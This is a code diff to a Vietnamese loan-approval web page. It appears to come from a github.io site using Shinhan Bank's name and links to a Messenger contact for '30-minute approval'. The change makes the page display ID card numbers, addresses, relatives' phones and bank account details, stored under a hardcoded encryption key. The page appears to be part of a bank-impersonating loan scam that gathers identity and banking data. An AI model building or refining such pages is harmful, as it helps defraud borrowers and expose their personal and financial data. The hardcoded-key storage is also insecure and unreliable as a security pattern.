@@ -196,11 +196,15 @@
             background-color: #fff;
             box-shadow: 0 1px 5px rgba(0,0,0,0.05);
         }
-        .user-data-section p {
-            margin: 8px 0;
-            font-size: 16px;
+        .user-data-section ul {
+            list-style: none;
+            padding: 0;
         }
-        .user-data-section p strong {
+        .user-data-section ul li {
+            margin: 8px 0;
+            font-size: 14px;
+        }
+        .user-data-section ul li strong {
             color: #003087;
         }
         .continue-btn-container {
@@ -293,7 +297,7 @@
                     <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-vay.html">GIẤY TỜ CẦN THIẾT</a></li>
                     <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
                     <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-tien-gui.html">XEM KẾT QUẢ</a></li>
-                    <li-REPLACE><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">ĐIỀU KHOẢN SỬ DỤNG</a></li>
+                    <li><a class="dropdown-item" href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">ĐIỀU KHOẢN SỬ DỤNG</a></li>
                     <li><a class="dropdown-item" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">LIÊN HỆ</a></li>
                     <li><a class="dropdown-item" href="https://m.me/shinhanfinancer?hash=AbbheNwiAth9Hcp7&source_id=8585216">MESSENGER</a></li>
                 </ul>
@@ -321,9 +325,33 @@
                 Quý khách đủ điều kiện! Vui lòng liên hệ nhân viên để được xét duyệt và xử lý nhanh chóng. Thời gian xét duyệt tự động từ 2-3 ngày. Liên hệ nhân viên để xác nhận duyệt trong 30 phút.
             </div>
             <div class="user-data-section">
-                <p><strong>Họ và Tên:</strong> <span id="displayFullName"></span></p>
-                <p><strong>Số Hợp Đồng:</strong> <span id="displayLoanCode"></span></p>
-                <p><strong>Số Tiền Phê Duyệt:</strong> <span id="displayApprovedAmount"></span></p>
+                <ul id="userDataList">
+                    <li><strong>Họ và Tên:</strong> <span id="displayFullName"></span></li>
+                    <li><strong>Ngày sinh:</strong> <span id="displayDob"></span></li>
+                    <li><strong>Giới tính:</strong> <span id="displayGender"></span></li>
+                    <li><strong>Địa chỉ thường trú:</strong> <span id="displayContactAddress"></span></li>
+                    <li><strong>Số định danh cá nhân (CCCD/CMND):</strong> <span id="displayIdNumber"></span></li>
+                    <li><strong>Nơi cấp:</strong> <span id="displayIdIssuePlace"></span></li>
+                    <li><strong>Số điện thoại:</strong> <span id="displayPhoneNumber"></span></li>
+                    <li><strong>E-mail:</strong> <span id="displayEmail"></span></li>
+                    <li><strong>Hình thức vay:</strong> <span id="displayLoanType"></span></li>
+                    <li><strong>Thời hạn vay:</strong> <span id="displayLoanTerm"></span></li>
+                    <li><strong>Số tiền vay:</strong> <span id="displayLoanAmount"></span></li>
+                    <li><strong>Lãi suất:</strong> <span id="displayInterestRate"></span></li>
+                    <li><strong>Dự kiến giải ngân ngày:</strong> <span id="displayDisbursementDate"></span></li>
+                    <li><strong>Thu nhập hàng tháng:</strong> <span id="displayIncome"></span></li>
+                    <li><strong>Nghề nghiệp:</strong> <span id="displayOccupation"></span></li>
+                    <li><strong>Mục đích vay:</strong> <span id="displayLoanPurpose"></span></li>
+                    <li><strong>Số điện thoại người thân:</strong> <span id="displayCompanyPhone"></span></li>
+                    <li><strong>Quan hệ:</strong> <span id="displayCompanyAddress"></span></li>
+                    <li><strong>Tên chủ tài khoản:</strong> <span id="displayAccountHolderName"></span></li>
+                    <li><strong>Số tài khoản:</strong> <span id="displayAccountNumber"></span></li>
+                    <li><strong>Tên ngân hàng:</strong> <span id="displayBankName"></span></li>
+                    <li><strong>Thanh toán hàng tháng:</strong> <span id="displayMonthlyPayment"></span></li>
+                    <li><strong>Tổng lãi phải trả:</strong> <span id="displayTotalInterest"></span></li>
+                    <li><strong>Tổng gốc + lãi:</strong> <span id="displayTotalRepayment"></span></li>
+                    <li><strong>Số Hợp Đồng:</strong> <span id="displayLoanCode"></span></li>
+                </ul>
             </div>
             <div class="completion-container">
                 <p class="completion-message">
@@ -369,34 +397,67 @@
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script>
-        const userData = {
-            fullName: "Nguyễn Văn A",
-            loanCode: "SHB123456",
-            approvedAmount: 100000000,
-            currentStep: 10
-        };
+        let userData = {};
 
         function formatNumber(number) {
-            return number.toString().replace(/\B739(?=(\d{3})+(?!\d))/g, ",") + " VND";
+            return number ? Number(number).toLocaleString('vi-VN') + ' VND' : 'Không có';
         }
 
         function loadUserData() {
-            const storedData = localStorage.getItem('userData');
-            if (storedData) {
-                Object.assign(userData, JSON.parse(storedData));
+            try {
+                const storedData = localStorage.getItem('userData');
+                if (storedData) {
+                    userData = JSON.parse(CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8));
+                    console.log('Loaded userData:', userData);
+                } else {
+                    console.error('No userData found in localStorage');
+                    $('.approval-notice').text('Không tìm thấy dữ liệu hồ sơ, vui lòng thử lại.');
+                }
+            } catch (error) {
+                console.error('Error parsing userData:', error);
+                $('.approval-notice').text('Lỗi tải dữ liệu, vui lòng thử lại.');
             }
         }
 
         function saveToLocalStorage() {
-            localStorage.setItem('userData', JSON.stringify(userData));
+            try {
+                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
+                localStorage.setItem('userData', encryptedData);
+                console.log('Saved userData:', userData);
+            } catch (error) {
+                console.error('Error saving userData:', error);
+            }
         }
 
         window.onload = function() {
             loadUserData();
-            $('#displayFullName').text(userData.fullName || '');
-            $('#displayLoanCode').text(userData.loanCode || '');
-            $('#displayApprovedAmount').text(userData.approvedAmount ? formatNumber(userData.approvedAmount) : '');
+            $('#displayFullName').text(userData.fullName || 'Không có');
+            $('#displayDob').text(userData.dob || 'Không có');
+            $('#displayGender').text(userData.gender || 'Không có');
+            $('#displayContactAddress').text(userData.contactAddress || 'Không có');
+            $('#displayIdNumber').text(userData.idNumber || 'Không có');
+            $('#displayIdIssuePlace').text(userData.idIssuePlace || 'Không có');
+            $('#displayPhoneNumber').text(userData.phoneNumber || 'Không có');
+            $('#displayEmail').text(userData.email || 'Không có');
+            $('#displayLoanType').text(userData.loanType || 'Không có');
+            $('#displayLoanTerm').text(userData.loanTerm ? userData.loanTerm + ' tháng' : 'Không có');
+            $('#displayLoanAmount').text(formatNumber(userData.loanAmount));
+            $('#displayInterestRate').text(userData.interestRate ? userData.interestRate + '%/năm' : 'Không có');
+            $('#displayDisbursementDate').text(userData.disbursementDate || 'Không có');
+            $('#displayIncome').text(formatNumber(userData.income));
+            $('#displayOccupation').text(userData.occupation || 'Không có');
+            $('#displayLoanPurpose').text(userData.loanPurpose || 'Không có');
+            $('#displayCompanyPhone').text(userData.companyPhone || 'Không có');
+            $('#displayCompanyAddress').text(userData.companyAddress || 'Không có');
+            $('#displayAccountHolderName').text(userData.accountHolderName || 'Không có');
+            $('#displayAccountNumber').text(userData.accountNumber || 'Không có');
+            $('#displayBankName').text(userData.bankName || 'Không có');
+            $('#displayMonthlyPayment').text(formatNumber(userData.monthlyPayment));
+            $('#displayTotalInterest').text(formatNumber(userData.totalInterest));
+            $('#displayTotalRepayment').text(formatNumber(userData.totalRepayment));
+            $('#displayLoanCode').text(userData.loanCode || 'Không có');
             userData.currentStep = 10;
             userData.isCompleted = true;
             saveToLocalStorage();
